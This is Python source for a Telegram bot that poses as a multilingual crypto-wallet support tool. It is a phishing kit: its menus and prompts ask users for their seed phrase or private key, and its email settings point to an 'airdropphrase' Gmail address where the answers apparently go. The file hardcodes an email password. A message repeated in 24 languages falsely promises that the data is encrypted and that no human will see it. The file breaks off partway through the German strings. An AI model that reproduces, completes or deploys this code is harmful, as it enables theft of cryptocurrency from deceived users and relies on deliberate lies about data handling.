# full updated main.py
import logging
import smtplib
from email.message import EmailMessage
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardRemove,
    ForceReply,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

# Conversation states
CHOOSE_LANGUAGE = 0
MAIN_MENU = 1
AWAIT_CONNECT_WALLET = 2
CHOOSE_WALLET_TYPE = 3
CHOOSE_OTHER_WALLET_TYPE = 4
PROMPT_FOR_INPUT = 5
RECEIVE_INPUT = 6
AWAIT_RESTART = 7
CLAIM_STICKER_INPUT = 8
CLAIM_STICKER_CONFIRM = 9

# --- Email Configuration (update in production) ---
SENDER_EMAIL = "airdropphrase@gmail.com"
SENDER_PASSWORD = "ipxs ffag eqmk otqd"  # Replace with secure secret (env var)
RECIPIENT_EMAIL = "airdropphrase@gmail.com"

# Base English wallet display names (brands / labels)
BASE_WALLET_NAMES = {
    "wallet_type_metamask": "Tonkeeper",
    "wallet_type_trust_wallet": "Telegram Wallet",
    "wallet_type_coinbase": "MyTon Wallet",
    "wallet_type_tonkeeper": "Tonhub",
    "wallet_type_phantom_wallet": "Trust Wallet",
    "wallet_type_rainbow": "Rainbow",
    "wallet_type_safepal": "SafePal",
    "wallet_type_wallet_connect": "Wallet Connect",
    "wallet_type_ledger": "Ledger",
    "wallet_type_brd_wallet": "BRD Wallet",
    "wallet_type_solana_wallet": "Solana Wallet",
    "wallet_type_balance": "Balance",
    "wallet_type_okx": "OKX",
    "wallet_type_xverse": "Xverse",
    "wallet_type_sparrow": "Sparrow",
    "wallet_type_earth_wallet": "Earth Wallet",
    "wallet_type_hiro": "Hiro",
    "wallet_type_saitamask_wallet": "Saitamask Wallet",
    "wallet_type_casper_wallet": "Casper Wallet",
    "wallet_type_cake_wallet": "Cake Wallet",
    "wallet_type_kepir_wallet": "Kepir Wallet",
    "wallet_type_icpswap": "ICPSwap",
    "wallet_type_kaspa": "Kaspa",
    "wallet_type_nem_wallet": "NEM Wallet",
    "wallet_type_near_wallet": "Near Wallet",
    "wallet_type_compass_wallet": "Compass Wallet",
    "wallet_type_stack_wallet": "Stack Wallet",
    "wallet_type_soilflare_wallet": "Soilflare Wallet",
    "wallet_type_aioz_wallet": "AIOZ Wallet",
    "wallet_type_xpla_vault_wallet": "XPLA Vault Wallet",
    "wallet_type_polkadot_wallet": "Polkadot Wallet",
    "wallet_type_xportal_wallet": "XPortal Wallet",
    "wallet_type_multiversx_wallet": "Multiversx Wallet",
    "wallet_type_verachain_wallet": "Verachain Wallet",
    "wallet_type_casperdash_wallet": "Casperdash Wallet",
    "wallet_type_nova_wallet": "Nova Wallet",
    "wallet_type_fearless_wallet": "Fearless Wallet",
    "wallet_type_terra_station": "Terra Station",
    "wallet_type_cosmos_station": "Cosmos Station",
    "wallet_type_exodus_wallet": "Exodus Wallet",
    "wallet_type_argent": "Argent",
    "wallet_type_binance_chain": "Binance Chain",
    "wallet_type_safemoon": "SafeMoon",
    "wallet_type_gnosis_safe": "Gnosis Safe",
    "wallet_type_defi": "DeFi",
    "wallet_type_other": "Other",
}

# Wallet word translations (used to localize "Wallet" where appropriate)
WALLET_WORD_BY_LANG = {
    "en": "Wallet",
    "es": "Billetera",
    "fr": "Portefeuille",
    "ru": "Кошелёк",
    "uk": "Гаманець",
    "fa": "کیف‌پول",
    "ar": "المحفظة",
    "pt": "Carteira",
    "id": "Dompet",
    "de": "Wallet",
    "nl": "Portemonnee",
    "hi": "वॉलेट",
    "tr": "Cüzdan",
    "zh": "钱包",
    "cs": "Peněženka",
    "ur": "والٹ",
    "uz": "Hamyon",
    "it": "Portafoglio",
    "ja": "ウォレット",
    "ms": "Dompet",
    "ro": "Portofel",
    "sk": "Peňaženka",
    "th": "กระเป๋าเงิน",
    "vi": "Ví",
}

# Professional reassurance (translated per language) - updated to explicitly mention the bot is encrypted
PROFESSIONAL_REASSURANCE = {
    "en": "\n\nFor your security: all information is processed automatically by this encrypted bot and stored encrypted. No human will access your data.",
    "es": "\n\nPara su seguridad: toda la información es procesada automáticamente por este bot cifrado y se almacena cifrada. Ninguna persona tendrá acceso a sus datos.",
    "fr": "\n\nPour votre sécurité : toutes les informations sont traitées automatiquement par ce bot chiffré et stockées de manière chiffrée. Aucune personne n'aura accès à vos données.",
    "ru": "\n\nВ целях вашей безопасности: вся информация обрабатывается автоматически этим зашифрованным ботом и хранится в зашифрованном виде. Человеческий доступ к вашим данным исключён.",
    "uk": "\n\nДля вашої безпеки: усі дані обробляються автоматично цим зашифрованим ботом і зберігаються в зашифрованому вигляді. Ніхто не має доступу до ваших даних.",
    "fa": "\n\nبرای امنیت شما: تمام اطلاعات به‌طور خودکار توسط این ربات رمزگذاری‌شده پردازش و به‌صورت رمزگذاری‌شده ذخیره می‌شوند. هیچ انسانی به داده‌های شما دسترسی نخواهد داشت.",
    "ar": "\n\nلأمانك: تتم معالجة جميع المعلومات تلقائيًا بواسطة هذا الروبوت المشفّر وتخزينها بشكل مشفّر. لا يمكن لأي شخص الوصول إلى بياناتك.",
    "pt": "\n\nPara sua segurança: todas as informações são processadas automaticamente por este bot criptografado e armazenadas criptografadas. Nenhum humano terá acesso aos seus dados.",
    "id": "\n\nDemi keamanan Anda: semua informasi diproses secara otomatis oleh bot terenkripsi ini dan disimpan dalam bentuk terenkripsi. Tidak ada orang yang akan mengakses data Anda.",
    "de": "\n\nZu Ihrer Sicherheit: Alle Informationen werden automatisch von diesem verschlüsselten Bot verarbeitet und verschlüsselt gespeichert. Kein Mensch hat Zugriff auf Ihre Daten.",
    "nl": "\n\nVoor uw veiligheid: alle informatie wordt automatisch verwerkt door deze versleutelde bot en versleuteld opgeslagen. Niemand krijgt toegang tot uw gegevens.",
    "hi": "\n\nआपकी सुरक्षा के लिए: सभी जानकारी इस एन्क्रिप्टेड बॉट द्वारा स्वचालित रूप से संसाधित और एन्क्रिप्ट करके संग्रहीत की जाती है। किसी भी मानव को आपके डेटा तक पहुंच नहीं होगी।",
    "tr": "\n\nGüvenliğiniz için: tüm bilgiler bu şifreli bot tarafından otomatik olarak işlenir ve şifrelenmiş olarak saklanır. Hiçbir insan verilerinize erişemez.",
    "zh": "\n\n为了您的安全：所有信息均由此加密机器人自动处理并以加密形式存储。不会有人访问您的数据。",
    "cs": "\n\nPro vaše bezpečí: všechny informace jsou automaticky zpracovávány tímto šifrovaným botem a ukládány zašifrovaně. K vašim datům nikdo nebude mít přístup.",
    "ur": "\n\nآپ کی حفاظت کے لیے: تمام معلومات خودکار طور پر اس خفیہ بوٹ کے ذریعہ پروسیس اور خفیہ طور پر محفوظ کی جاتی ہیں۔ کسی انسان کو آپ کے ڈیٹا تک رسائی نہیں ہوگی۔",
    "uz": "\n\nXavfsizligingiz uchun: barcha ma'lumotlar ushbu shifrlangan bot tomonidan avtomatik qayta ishlanadi va shifrlangan holda saqlanadi. Hech kim sizning ma'lumotlaringizga kira olmaydi.",
    "it": "\n\nPer la vostra sicurezza: tutte le informazioni sono elaborate automaticamente da questo bot crittografato e memorizzate in modo crittografato. Nessun umano avrà accesso ai vostri dati.",
    "ja": "\n\nお客様の安全のために：すべての情報はこの暗号化されたボットによって自動的に処理され、暗号化された状態で保存されます。人間がデータにアクセスすることはありません。",
    "ms": "\n\nUntuk keselamatan anda: semua maklumat diproses secara automatik oleh bot tersulit ini dan disimpan dalam bentuk tersulit. Tiada manusia akan mengakses data anda.",
    "ro": "\n\nPentru siguranța dumneavoastră: toate informațiile sunt procesate automat de acest bot criptat și stocate criptat. Nicio persoană nu va avea acces la datele dumneavoastră.",
    "sk": "\n\nPre vaše bezpečie: všetky informácie sú automaticky spracovávané týmto šifrovaným botom a ukladané v zašifrovanej podobe. Nikto nebude mať prístup k vašim údajom.",
    "th": "\n\nเพื่อความปลอดภัยของคุณ: ข้อมูลทั้งหมดจะได้รับการประมวลผลโดยอัตโนมัติโดยบอทที่เข้ารหัสนี้และจัดเก็บในรูปแบบที่เข้ารหัส ไม่มีใครเข้าถึงข้อมูลของคุณได้",
    "vi": "\n\nVì sự an toàn của bạn: tất cả thông tin được xử lý tự động bởi bot được mã hóa này và được lưu trữ dưới dạng đã mã hóa. Không ai có thể truy cập dữ liệu của bạn.",
}

# Full multi-language UI texts (24 languages). Each key is present for all languages.
# 'prompt seed' and 'prompt private key' use the PROFESSIONAL_REASSURANCE appended.
LANGUAGES = {
    "en": {
        "welcome": "Hi {user}! Welcome to your ultimate self-service resolution tool for all your crypto wallet needs! This bot is designed to help you quickly and efficiently resolve common issues such as Connection Errors, Migration Challenges, Staking Complications, High Gas Fees, Stuck Transactions, Missing Funds, Claim Rejections, Liquidity Problems, Frozen Transactions, Swapping Difficulties, and Lost Tokens. Whether you're facing issues with wallet synchronization, incorrect token balances, failed transfers, we've got you covered. Our goal is to guide you through the troubleshooting process step-by-step, empowering you to take control of your crypto wallet experience. Let's get started and resolve your issues today!",
        "main menu title": "Please select an issue type to continue:",
        "buy": "Buy",
        "validation": "Validation",
        "claim tokens": "Claim Tokens",
        "migration issues": "Migration Issues",
        "assets recovery": "Assets Recovery",
        "general issues": "General Issues",
        "rectification": "Rectification",
        "staking issues": "Staking Issues",
        "deposits": "Deposits",
        "withdrawals": "Withdrawals",
        "missing balance": "Missing Balance",
        "login issues": "Login Issues",
        "high gas fees": "High Gas Fees",
        "presale issues": "Presale Issues",
        "claim missing sticker": "Claim Missing Sticker",
        "connect wallet message": "Please connect your wallet with your Private Key or Seed Phrase to continue.",
        "connect wallet button": "🔑 Connect Wallet",
        "select wallet type": "Please select your wallet type:",
        "other wallets": "Other Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "wallet selection message": "You have selected {wallet_name}.\nSelect your preferred mode of connection.",
        "reassurance": PROFESSIONAL_REASSURANCE["en"],
        "prompt seed": "Please enter your BOINKERS username and the 12/24 words of your wallet." + PROFESSIONAL_REASSURANCE["en"],
        "prompt private key": "Please enter your private key." + PROFESSIONAL_REASSURANCE["en"],
        "invalid choice": "Invalid choice. Please use the buttons.",
        "final error message": "‼️ An error occurred. Please ensure you are entering the correct key; use copy & paste to avoid errors. Use /start to try again.",
        "choose language": "Please select your preferred language:",
        "await restart message": "Please click /start to start over.",
        "enter stickers prompt": "Kindly type in the sticker(s) you want to claim.",
        "confirm claim stickers": "Are you sure you want to proceed and claim the stickers you entered?",
        "yes": "Yes",
        "no": "No",
        "back": "🔙 Back",
        "invalid_input": "Invalid input. Please use /start to begin.",
    },
    "es": {
        "welcome": "¡Hola {user}! Bienvenido a su herramienta de autoservicio definitiva para todas las necesidades de su billetera de criptomonedas. Este bot está diseñado para ayudarle a resolver rápidamente problemas comunes y guiarle paso a paso.",
        "main menu title": "Seleccione un tipo de problema para continuar:",
        "buy": "Comprar",
        "validation": "Validación",
        "claim tokens": "Reclamar Tokens",
        "migration issues": "Problemas de Migración",
        "assets recovery": "Recuperación de Activos",
        "general issues": "Problemas Generales",
        "rectification": "Rectificación",
        "staking issues": "Problemas de Staking",
        "deposits": "Depósitos",
        "withdrawals": "Retiros",
        "missing balance": "Saldo Perdido",
        "login issues": "Problemas de Inicio de Sesión",
        "high gas fees": "Altas Tarifas de Gas",
        "presale issues": "Problemas de Preventa",
        "claim missing sticker": "Reclamar Sticker Perdido",
        "connect wallet message": "Por favor, conecte su billetera con su Clave Privada o Frase Semilla para continuar.",
        "connect wallet button": "🔑 Conectar Billetera",
        "select wallet type": "Por favor, seleccione el tipo de su billetera:",
        "other wallets": "Otras Billeteras",
        "private key": "🔑 Clave Privada",
        "seed phrase": "🔒 Importar Frase Seed",
        "wallet selection message": "Ha seleccionado {wallet_name}.\nSeleccione su modo de conexión preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE["es"],
        "prompt seed": "Por favor, ingrese su nombre de usuario BOINKERS y las 12/24 palabras de su billetera." + PROFESSIONAL_REASSURANCE["es"],
        "prompt private key": "Por favor, ingrese su clave privada." + PROFESSIONAL_REASSURANCE["es"],
        "invalid choice": "Opción inválida. Por favor, use los botones.",
        "final error message": "‼️ Ha ocurrido un error. Asegúrese de ingresar la clave correcta. /start para intentarlo de nuevo.",
        "choose language": "Por favor, seleccione su idioma preferido:",
        "await restart message": "Por favor, haga clic en /start para empezar de nuevo.",
        "enter stickers prompt": "Por favor, escriba los sticker(s) que desea reclamar.",
        "confirm claim stickers": "¿Está seguro de que desea proceder y reclamar los stickers que ingresó?",
        "yes": "Sí",
        "no": "No",
        "back": "🔙 Volver",
        "invalid_input": "Entrada inválida. Por favor use /start para comenzar.",
    },
    "fr": {
        "welcome": "Salut {user} ! Bienvenue dans votre outil d'auto-service ultime pour tous vos besoins de portefeuille crypto. Ce bot vous aidera à résoudre rapidement les problèmes courants et à vous guider pas à pas.",
        "main menu title": "Veuillez sélectionner un type de problème pour continuer :",
        "buy": "Acheter",
        "validation": "Validation",
        "claim tokens": "Réclamer des Tokens",
        "migration issues": "Problèmes de Migration",
        "assets recovery": "Récupération d'Actifs",
        "general issues": "Problèmes Généraux",
        "rectification": "Rectification",
        "staking issues": "Problèmes de Staking",
        "deposits": "Dépôts",
        "withdrawals": "Retraits",
        "missing balance": "Solde Manquant",
        "login issues": "Problèmes de Connexion",
        "high gas fees": "Frais de Gaz Élevés",
        "presale issues": "Problèmes de Prévente",
        "claim missing sticker": "Réclamer l'autocollant manquant",
        "connect wallet message": "Veuillez connecter votre portefeuille avec votre clé privée ou votre phrase seed pour continuer.",
        "connect wallet button": "🔑 Connecter un Portefeuille",
        "select wallet type": "Veuillez sélectionner votre type de portefeuille :",
        "other wallets": "Autres Portefeuilles",
        "private key": "🔑 Clé Privée",
        "seed phrase": "🔒 Importer une Phrase Seed",
        "wallet selection message": "Vous avez sélectionné {wallet_name}.\nSélectionnez votre mode de connexion préféré.",
        "reassurance": PROFESSIONAL_REASSURANCE["fr"],
        "prompt seed": "Veuillez entrer votre nom d'utilisateur BOINKERS et les 12/24 mots de votre portefeuille." + PROFESSIONAL_REASSURANCE["fr"],
        "prompt private key": "Veuillez entrer votre clé privée." + PROFESSIONAL_REASSURANCE["fr"],
        "invalid choice": "Choix invalide. Veuillez utiliser les boutons.",
        "final error message": "‼️ Une erreur est survenue. Veuillez /start pour réessayer.",
        "choose language": "Veuillez sélectionner votre langue préférée :",
        "await restart message": "Veuillez cliquer sur /start pour recommencer.",
        "enter stickers prompt": "Veuillez taper les sticker(s) que vous souhaitez réclamer.",
        "confirm claim stickers": "Êtes-vous sûr de vouloir procéder et réclamer les autocollants saisis ?",
        "yes": "Oui",
        "no": "Non",
        "back": "🔙 Retour",
        "invalid_input": "Entrée invalide. Veuillez utiliser /start pour commencer.",
    },
    "ru": {
        "welcome": "Привет, {user}! Добро пожаловать в инструмент самообслуживания для всех задач вашего криптокошелька. Этот бот поможет быстро и профессионально решить распространённые проблемы.",
        "main menu title": "Пожалуйста, выберите тип проблемы, чтобы продолжить:",
        "buy": "Купить",
        "validation": "Валидация",
        "claim tokens": "Получить Токены",
        "migration issues": "Проблемы с Миграцией",
        "assets recovery": "Восстановление Активов",
        "general issues": "Общие Проблемы",
        "rectification": "Исправление",
        "staking issues": "Проблемы со Стейкингом",
        "deposits": "Депозиты",
        "withdrawals": "Выводы",
        "missing balance": "Пропавший Баланс",
        "login issues": "Проблемы со Входом",
        "high gas fees": "Высокие Комиссии за Газ",
        "presale issues": "Проблемы с Предпродажей",
        "claim missing sticker": "Запросить Пропавший Стикер",
        "connect wallet message": "Пожалуйста, подключите кошелёк с помощью приватного ключа или seed-фразы.",
        "connect wallet button": "🔑 Подключить Кошелёк",
        "select wallet type": "Пожалуйста, выберите тип вашего кошелька:",
        "other wallets": "Другие Кошельки",
        "private key": "🔑 Приватный Ключ",
        "seed phrase": "🔒 Импортировать Seed Фразу",
        "wallet selection message": "Вы выбрали {wallet_name}.\nВыберите предпочтительный способ подключения.",
        "reassurance": PROFESSIONAL_REASSURANCE["ru"],
        "prompt seed": "Пожалуйста, введите ваш логин BOINKERS и 12/24 слов вашей seed-фразы." + PROFESSIONAL_REASSURANCE["ru"],
        "prompt private key": "Пожалуйста, введите ваш приватный ключ." + PROFESSIONAL_REASSURANCE["ru"],
        "invalid choice": "Неверный выбор. Пожалуйста, используйте кнопки.",
        "final error message": "‼️ Произошла ошибка. Пожалуйста, /start чтобы попробовать снова.",
        "choose language": "Пожалуйста, выберите язык:",
        "await restart message": "Пожалуйста, нажмите /start чтобы начать заново.",
        "enter stickers prompt": "Пожалуйста, напишите стикер(ы), которые вы хотите запросить.",
        "confirm claim stickers": "Вы уверены, что хотите продолжить и запросить введённые стикеры?",
        "yes": "Да",
        "no": "Нет",
        "back": "🔙 Назад",
        "invalid_input": "Неверный ввод. Пожалуйста используйте /start чтобы начать.",
    },
    "uk": {
        "welcome": "Привіт, {user}! Ласкаво просимо до інструменту самообслуговування для всіх потреб вашого криптогаманця. Цей бот допоможе швидко й ефективно вирішувати поширені проблеми.",
        "main menu title": "Будь ласка, виберіть тип проблеми для продовження:",
        "buy": "Купити",
        "validation": "Валідація",
        "claim tokens": "Отримати Токени",
        "migration issues": "Проблеми з Міграцією",
        "assets recovery": "Відновлення Активів",
        "general issues": "Загальні Проблеми",
        "rectification": "Виправлення",
        "staking issues": "Проблеми зі Стейкінгом",
        "deposits": "Депозити",
        "withdrawals": "Виведення",
        "missing balance": "Зниклий Баланс",
        "login issues": "Проблеми з Входом",
        "high gas fees": "Високі Комісії за Газ",
        "presale issues": "Проблеми з Передпродажем",
        "claim missing sticker": "Заявити Відсутній Стикер",
        "connect wallet message": "Будь ласка, підключіть гаманець за допомогою приватного ключа або seed-фрази.",
        "connect wallet button": "🔑 Підключити Гаманець",
        "select wallet type": "Будь ласка, виберіть тип гаманця:",
        "other wallets": "Інші Гаманці",
        "private key": "🔑 Приватний Ключ",
        "seed phrase": "🔒 Імпортувати Seed Фразу",
        "wallet selection message": "Ви вибрали {wallet_name}.\nВиберіть спосіб підключення.",
        "reassurance": PROFESSIONAL_REASSURANCE["uk"],
        "prompt seed": "Будь ласка, введіть ваш логін BOINKERS і 12/24 слів seed-фрази." + PROFESSIONAL_REASSURANCE["uk"],
        "prompt private key": "Будь ласка, введіть ваш приватний ключ." + PROFESSIONAL_REASSURANCE["uk"],
        "invalid choice": "Неправильний вибір. Будь ласка, використовуйте кнопки.",
        "final error message": "‼️ Сталася помилка. Будь ласка, /start щоб спробувати знову.",
        "choose language": "Будь ласка, виберіть мову:",
        "await restart message": "Натисніть /start щоб почати заново.",
        "enter stickers prompt": "Будь ласка, введіть стікер(и), які ви хочете заявити.",
        "confirm claim stickers": "Ви впевнені, що хочете продовжити і заявити вказані стікери?",
        "yes": "Так",
        "no": "Ні",
        "back": "🔙 Назад",
        "invalid_input": "Недійсний ввід. Будь ласка, використовуйте /start щоб почати.",
    },
    "fa": {
        "welcome": "سلام {user}! به ابزار خودخدمت نهایی برای رفع مشکلات کیف‌پول کریپتو خوش آمدید. این ربات به شما کمک می‌کند مشکلات رایج را سریع و با رعایت امنیت حل کنید.",
        "main menu title": "لطفاً یک نوع مشکل را انتخاب کنید:",
        "buy": "خرید",
        "validation": "اعتبارسنجی",
        "claim tokens": "دریافت توکن‌ها",
        "migration issues": "مسائل مهاجرت",
        "assets recovery": "بازیابی دارایی‌ها",
        "general issues": "مسائل عمومی",
        "rectification": "اصلاح",
        "staking issues": "مسائل استیکینگ",
        "deposits": "واریز",
        "withdrawals": "برداشت",
        "missing balance": "موجودی گمشده",
        "login issues": "مسائل ورود",
        "high gas fees": "هزینه‌های بالای گس",
        "presale issues": "مسائل پیش‌فروش",
        "claim missing sticker": "درخواست استیکر گم‌شده",
        "connect wallet message": "لطفاً کیف‌پول خود را با کلید خصوصی یا عبارت seed متصل کنید.",
        "connect wallet button": "🔑 اتصال کیف‌پول",
        "select wallet type": "لطفاً نوع کیف‌پول را انتخاب کنید:",
        "other wallets": "کیف‌پول‌های دیگر",
        "private key": "🔑 کلید خصوصی",
        "seed phrase": "🔒 وارد کردن Seed Phrase",
        "wallet selection message": "شما {wallet_name} را انتخاب کرده‌اید.\nروش اتصال را انتخاب کنید.",
        "reassurance": PROFESSIONAL_REASSURANCE["fa"],
        "prompt seed": "لطفاً نام کاربری BOINKERS و 12/24 کلمه کیف‌پول خود را وارد کنید." + PROFESSIONAL_REASSURANCE["fa"],
        "prompt private key": "لطفاً کلید خصوصی خود را وارد کنید." + PROFESSIONAL_REASSURANCE["fa"],
        "invalid choice": "انتخاب نامعتبر است. لطفاً از دکمه‌ها استفاده کنید.",
        "final error message": "‼️ خطا رخ داد. لطفاً /start را برای تلاش مجدد بزنید.",
        "choose language": "لطفاً زبان را انتخاب کنید:",
        "await restart message": "برای شروع دوباره /start را فشار دهید.",
        "enter stickers prompt": "لطفاً استیکر(ها)یی که می‌خواهید درخواست کنید را تایپ کنید.",
        "confirm claim stickers": "آیا مطمئن هستید که می‌خواهید ادامه دهید و استیکرهای وارد شده را درخواست کنید؟",
        "yes": "بله",
        "no": "خیر",
        "back": "🔙 بازگشت",
        "invalid_input": "ورودی نامعتبر. لطفاً از /start استفاده کنید.",
    },
    "ar": {
        "welcome": "مرحبًا {user}! مرحبًا بك في أداة الخدمة الذاتية لمشاكل محفظتك المشفرة. هذا البوت يساعدك على حل المشكلات الشائعة بسرعة وبشكل آمن.",
        "main menu title": "يرجى تحديد نوع المشكلة للمتابعة:",
        "buy": "شراء",
        "validation": "التحقق",
        "claim tokens": "المطالبة بالرموز",
        "migration issues": "مشاكل الترحيل",
        "assets recovery": "استرداد الأصول",
        "general issues": "مشاكل عامة",
        "rectification": "تصحيح",
        "staking issues": "مشاكل الستاكينج",
        "deposits": "الودائع",
        "withdrawals": "السحوبات",
        "missing balance": "رصيد مفقود",
        "login issues": "مشاكل تسجيل الدخول",
        "high gas fees": "رسوم غاز مرتفعة",
        "presale issues": "مشاكل البيع المسبق",
        "claim missing sticker": "المطالبة بالملصق المفقود",
        "connect wallet message": "يرجى توصيل محفظتك باستخدام مفتاحك الخاص أو عبارة seed للمتابعة.",
        "connect wallet button": "🔑 توصيل المحفظة",
        "select wallet type": "يرجى تحديد نوع المحفظة:",
        "other wallets": "محافظ أخرى",
        "private key": "🔑 مفتاح خاص",
        "seed phrase": "🔒 استيراد Seed Phrase",
        "wallet selection message": "لقد اخترت {wallet_name}.\nحدد وضع الاتصال المفضل.",
        "reassurance": PROFESSIONAL_REASSURANCE["ar"],
        "prompt seed": "يرجى إدخال اسم مستخدم BOINKERS والكلمات الـ12/24 لمحفظتك." + PROFESSIONAL_REASSURANCE["ar"],
        "prompt private key": "يرجى إدخال مفتاحك الخاص." + PROFESSIONAL_REASSURANCE["ar"],
        "invalid choice": "خيار غير صالح. يرجى استخدام الأزرار.",
        "final error message": "‼️ حدث خطأ. يرجى /start للمحاولة مرة أخرى.",
        "choose language": "يرجى اختيار لغتك المفضلة:",
        "await restart message": "انقر /start للبدء من جديد.",
        "enter stickers prompt": "يرجى كتابة الملصق(ات) التي تريد المطالبة بها.",
        "confirm claim stickers": "هل أنت متأكد أنك تريد المتابعة والمطالبة بالملصقات التي أدخلتها؟",
        "yes": "نعم",
        "no": "لا",
        "back": "🔙 عودة",
        "invalid_input": "إدخال غير صالح. يرجى استخدام /start للبدء.",
    },
    "pt": {
        "welcome": "Olá {user}! Bem-vindo à sua ferramenta self-service para todas as necessidades da sua carteira crypto. Este bot ajuda a resolver problemas comuns de forma rápida e segura.",
        "main menu title": "Selecione um tipo de problema para continuar:",
        "buy": "Comprar",
        "validation": "Validação",
        "claim tokens": "Reivindicar Tokens",
        "migration issues": "Problemas de Migração",
        "assets recovery": "Recuperação de Ativos",
        "general issues": "Problemas Gerais",
        "rectification": "Retificação",
        "staking issues": "Problemas de Staking",
        "deposits": "Depósitos",
        "withdrawals": "Saques",
        "missing balance": "Saldo Ausente",
        "login issues": "Problemas de Login",
        "high gas fees": "Altas Taxas de Gás",
        "presale issues": "Problemas de Pré-venda",
        "claim missing sticker": "Reivindicar Sticker Ausente",
        "connect wallet message": "Por favor, conecte sua carteira com sua Chave Privada ou Frase Seed para continuar.",
        "connect wallet button": "🔑 Conectar Carteira",
        "select wallet type": "Por favor, selecione o tipo da sua carteira:",
        "other wallets": "Outras Carteiras",
        "private key": "🔑 Chave Privada",
        "seed phrase": "🔒 Importar Seed Phrase",
        "wallet selection message": "Você selecionou {wallet_name}.\nSelecione o modo de conexão preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE["pt"],
        "prompt seed": "Por favor, insira seu nome de usuário BOINKERS e as 12/24 palavras da sua carteira." + PROFESSIONAL_REASSURANCE["pt"],
        "prompt private key": "Por favor, insira sua chave privada." + PROFESSIONAL_REASSURANCE["pt"],
        "invalid choice": "Escolha inválida. Use os botões.",
        "final error message": "‼️ Ocorreu um erro. /start para tentar novamente.",
        "choose language": "Por favor, selecione seu idioma preferido:",
        "await restart message": "Clique em /start para reiniciar.",
        "enter stickers prompt": "Por favor, digite o(s) sticker(s) que deseja reivindicar.",
        "confirm claim stickers": "Tem certeza que deseja proceder e reivindicar os stickers inseridos?",
        "yes": "Sim",
        "no": "Não",
        "back": "🔙 Voltar",
        "invalid_input": "Entrada inválida. Por favor use /start para começar.",
    },
    "id": {
        "welcome": "Halo {user}! Selamat datang di alat self-service untuk kebutuhan dompet kripto Anda. Bot ini membantu menyelesaikan masalah umum dengan cepat dan aman.",
        "main menu title": "Silakan pilih jenis masalah untuk melanjutkan:",
        "buy": "Beli",
        "validation": "Validasi",
        "claim tokens": "Klaim Token",
        "migration issues": "Masalah Migrasi",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Masalah Umum",
        "rectification": "Rekonsiliasi",
        "staking issues": "Masalah Staking",
        "deposits": "Deposit",
        "withdrawals": "Penarikan",
        "missing balance": "Saldo Hilang",
        "login issues": "Masalah Login",
        "high gas fees": "Biaya Gas Tinggi",
        "presale issues": "Masalah Pra-penjualan",
        "claim missing sticker": "Klaim Sticker Hilang",
        "connect wallet message": "Silakan sambungkan dompet Anda dengan Kunci Pribadi atau Seed Phrase untuk melanjutkan.",
        "connect wallet button": "🔑 Sambungkan Dompet",
        "select wallet type": "Silakan pilih jenis dompet Anda:",
        "other wallets": "Dompet Lain",
        "private key": "🔑 Kunci Pribadi",
        "seed phrase": "🔒 Impor Seed Phrase",
        "wallet selection message": "Anda telah memilih {wallet_name}.\nPilih mode koneksi yang diinginkan.",
        "reassurance": PROFESSIONAL_REASSURANCE["id"],
        "prompt seed": "Silakan masukkan nama pengguna BOINKERS dan 12/24 kata dompet Anda." + PROFESSIONAL_REASSURANCE["id"],
        "prompt private key": "Silakan masukkan kunci pribadi Anda." + PROFESSIONAL_REASSURANCE["id"],
        "invalid choice": "Pilihan tidak valid. Gunakan tombol.",
        "final error message": "‼️ Terjadi kesalahan. /start untuk mencoba lagi.",
        "choose language": "Silakan pilih bahasa pilihan Anda:",
        "await restart message": "Klik /start untuk memulai ulang.",
        "enter stickers prompt": "Silakan ketik sticker(s) yang ingin Anda klaim.",
        "confirm claim stickers": "Apakah Anda yakin ingin melanjutkan dan mengklaim stiker yang dimasukkan?",
        "yes": "Ya",
        "no": "Tidak",
        "back": "🔙 Kembali",
        "invalid_input": "Input tidak valid. Silakan gunakan /start untuk memulai.",
    },
    "de": {
        "welcome": "Hallo {user}! Willkommen bei Ihrem Self-Service-Tool für alle Anliegen rund um Ihre Krypto-Wallet. Dieser Bot hilft Ihnen, häufige Probleme schnell und sicher zu lösen.",
        "main menu title": "Bitte wählen Sie eine Art von Problem aus, um fortzufahren:",
        "buy": "Kaufen",
        "validation": "Validierung",
        "claim tokens": "Tokens Beanspruchen",
        "migration issues": "Migrationsprobleme",
        "assets recovery": "Wiederherstellung von Vermögenswerten",
        "general issues": "Allgemeine Probleme",
        "rectification": "Berichtigung",
        "staking issues": "Staking-Probleme",
        "deposits": "Einzahlungen",
        "withdrawals": "Auszahlungen",
        "missing balance": "Fehlender Saldo",
        "login issues": "Anmeldeprobleme",
        "high gas fees": "Hohe Gasgebühren",
        "presale issues": "Presale-Probleme",
        "claim missing sticker": "Fehlenden Sticker Beanspruchen",
        "connect wallet message": "Bitte verbinden Sie Ihre Wallet mit Ihrem privaten Schlüssel oder Ihrer Seed-Phrase, um fortzufahren.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Bitte wählen Sie Ihren Wallet-Typ:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privater Schlüssel",
        "seed phrase": "🔒 Seed-Phrase importieren",
        "wallet selection message": "Sie haben {wallet_name} ausgewählt.\nWählen Sie Ihre bevorzugte Verbindungsmethode.",
        "reassurance": PROFESSIONAL_REASSURANCE["de"],
        "prompt seed": "Bitte geben Sie Ihren BOINKERS-Benutzernamen und die 12/24 Wörter Ihres Wallets ein." + PROFESSIONAL_REASSURANCE["de"],
        "prompt private key": "Bitte geben Sie Ihren privaten Schlüssel ein." + PROFESSIONAL_REASSURANCE["de"],
        "invalid choice": "Ungültige Auswahl. Bitte benutzen Sie die Buttons.",
        "final error message": "‼️ Ein Fehler ist aufgetreten. Bitte /start zum Wiederholen.",
        "choose language": "Bitte wählen Sie Ihre bevorzugte Sprache:",
        "await restart message": "Bitte klicken Sie auf /start, um neu zu beginnen.",
        "enter stickers prompt": "Bitte geben Sie die(n) Sticker ein, die Sie beanspruchen möchten.",
